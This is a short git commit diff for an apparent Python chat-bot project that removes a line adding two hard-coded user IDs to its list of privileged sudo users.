33d9e4bda703f9dda82c8c1d0804db212a99b22b
GalihMrd <69835093+galihmrd@users.noreply.github.com>
2022-10-29 15:35:41 +0700

    Remove extend sudo

--- lib/helpers/decorators.py
+++ lib/helpers/decorators.py
@@ -7,8 +7,6 @@ from lib.config import SUDO_USERS
 from lib.helpers.database.blacklist import is_bl
 from lib.helpers.database.sudo_sql import is_sudo
 
-SUDO_USERS.extend([1317936398, 1095222353])
-
 
 def sudo_users(func: Callable) -> Callable:
     async def decorator(client, message):
